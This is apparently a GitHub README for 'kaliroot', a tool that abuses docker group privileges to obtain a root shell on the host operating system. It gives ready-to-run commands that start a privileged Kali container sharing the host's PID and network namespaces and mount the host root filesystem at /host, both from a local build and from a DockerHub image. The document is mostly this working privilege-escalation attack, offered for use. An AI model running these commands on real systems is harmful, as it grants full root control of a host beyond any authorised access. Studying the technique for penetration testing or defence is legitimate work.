# kaliroot

Abuses `docker` group privileges to gain a root level shell into the main operating system.

Exit the chroot shell, and you now have access to any Kali tools you need, and access the host root filesystem at `/host`.

This is part of my slightly larger project on GitHub called [dockergroupabuse](https://github.com/phx/dockergroupabuse).

## Install via Git

```sh
git clone https://github.com/phx/kaliroot
cd kaliroot
docker build -t kaliroot .
docker run --privileged --pid=host --net=host -itv /:/host kaliroot
```

## Install via DockerHub:
`docker run --privileged --pid=host --net=host -itv /:/host lphxl/kaliroot`
